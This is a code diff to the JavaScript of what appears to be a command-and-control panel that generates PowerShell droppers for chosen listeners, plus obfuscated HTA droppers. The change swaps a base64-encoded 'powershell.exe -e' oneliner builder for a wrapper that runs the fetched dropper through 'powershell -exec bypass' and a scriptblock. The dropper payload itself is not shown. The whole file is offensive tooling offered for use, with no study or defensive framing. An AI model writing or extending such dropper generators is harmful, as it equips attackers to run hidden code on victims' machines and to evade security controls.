@@ -139,13 +139,9 @@ function openAgentGenerator() {
         loadListenerDropdown();
     }
     
-    const onelinerBtn = document.getElementById('generateOnelinerBtn');
     const htaBtn = document.getElementById('generateHTABtn');
     const obfLevelSection = document.getElementById('obfuscationLevelSection');
-    
-    if (onelinerBtn) {
-        onelinerBtn.style.display = 'none';
-    }
+
     if (htaBtn) {
         htaBtn.style.display = 'none';
     }
@@ -167,8 +163,8 @@ async function generateDropper() {
     const listenerId = listenerSelect ? listenerSelect.value : '';
     const generateBtn = document.getElementById('generateDropperBtn');
     const codeOutput = document.getElementById('generatedCode');
-    const onelinerBtn = document.getElementById('generateOnelinerBtn');
     const htaBtn = document.getElementById('generateHTABtn');
+    const obfLevelSection = document.getElementById('obfuscationLevelSection');
 
     if (!listenerId) {
         alert('Please select a listener. Create one from the Listeners panel first.');
@@ -179,42 +175,45 @@ async function generateDropper() {
     generateBtn.disabled = false;
 
     codeOutput.textContent = '# Connecting to server to generate dropper...';
-    onelinerBtn.style.display = 'none';
     htaBtn.style.display = 'none';
 
     try {
         const response = await fetch(`/dropper/${listenerId}`);
-        
+
         if (response.status === 401) {
             throw new Error('Not authorized - Please login again');
         }
-        
+
         if (response.status === 400) {
             const errorText = await response.text();
             throw new Error(errorText || 'Invalid IP/Host');
         }
-        
+
         if (!response.ok) {
             throw new Error(`Server error: HTTP ${response.status}`);
         }
-        
+
         const dropperCode = await response.text();
-        
-        codeOutput.textContent = dropperCode;
-        
-        onelinerBtn.style.display = 'block';
-        
+        const escapedCode = dropperCode.replace(/'/g, "''");
+        codeOutput.textContent = `powershell -exec bypass -Command "& ([scriptblock]::Create('${escapedCode}'))"`;
+
+
+        htaBtn.style.display = 'block';
+        if (obfLevelSection) {
+            obfLevelSection.style.display = 'block';
+        }
+
         showDropperSuccess(listenerId);
-        
+
     } catch (error) {
         codeOutput.textContent = `# Error generating dropper: ${error.message}
-# 
+#
 # Please check:
 # - The IP/Host is correct
 # - You are authenticated in the system
 # - The server is online
 # - There are no connectivity issues`;
-        
+
         alert(`Error: ${error.message}`);
     } finally {
         generateBtn.innerHTML = originalText;
@@ -222,80 +221,26 @@ async function generateDropper() {
     }
 }
 
-function generateOneliner() {
-    const code = document.getElementById('generatedCode').textContent;
-    const onelinerOutput = document.getElementById('onelinerCode');
-    const onelinerBtn = document.getElementById('generateOnelinerBtn');
+async function generateHTADropper() {
+    const dropperCode = document.getElementById('generatedCode').textContent;
     const htaBtn = document.getElementById('generateHTABtn');
-    const obfLevelSection = document.getElementById('obfuscationLevelSection');
-    
-    if (!code || code.startsWith('#')) {
+    const obfuscationLevel = document.getElementById('obfuscationLevel').value;
+
+    if (!dropperCode || dropperCode.startsWith('#')) {
         alert('First generate the PowerShell dropper');
         return;
     }
-    
-    try {
-        const originalText = onelinerBtn.innerHTML;
-        onelinerBtn.disabled = false;
-        
-        let utf16leBytes = [];
-        for (let i = 0; i < code.length; i++) {
-            const charCode = code.charCodeAt(i);
-            utf16leBytes.push(charCode & 0xFF);
-            utf16leBytes.push((charCode >> 8) & 0xFF);
-        }
-        
-        let binaryString = '';
-        for (let i = 0; i < utf16leBytes.length; i++) {
-            binaryString += String.fromCharCode(utf16leBytes[i]);
-        }
-        const base64 = btoa(binaryString);
-        
-        const oneliner = `powershell.exe -e ${base64}`;
-        
-        onelinerOutput.textContent = oneliner;
-        onelinerOutput.style.display = 'block';
-        
-        document.getElementById('onelinerSection').style.display = 'block';
-        
-        htaBtn.style.display = 'block';
-        if (obfLevelSection) {
-            obfLevelSection.style.display = 'block';
-        }
-        
-        showOnelinerSuccess();
-        
-    } catch (error) {
-        alert(`Error generating oneliner: ${error.message}`);
-        
-        onelinerOutput.textContent = `# Error generating oneliner: ${error.message}`;
-        onelinerOutput.style.display = 'block';
-    } finally {
-        onelinerBtn.innerHTML = originalText;
-        onelinerBtn.disabled = false;
-    }
-}
 
-async function generateHTADropper() {
-    const onelinerCode = document.getElementById('onelinerCode').textContent;
-    const htaBtn = document.getElementById('generateHTABtn');
-    const obfuscationLevel = document.getElementById('obfuscationLevel').value;
-    
-    if (!onelinerCode || onelinerCode.startsWith('#')) {
-        alert('First generate the oneliner command');
-        return;
-    }
-    
     try {
         const originalText = htaBtn.innerHTML;
-        
+
         const response = await fetch(CONFIG.API.HTA_DROPPER, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
             },
             body: JSON.stringify({
-                oneliner: onelinerCode.trim(),
+                dropper_code: dropperCode.trim(),
                 obfuscation_level: parseInt(obfuscationLevel)
             })
         });
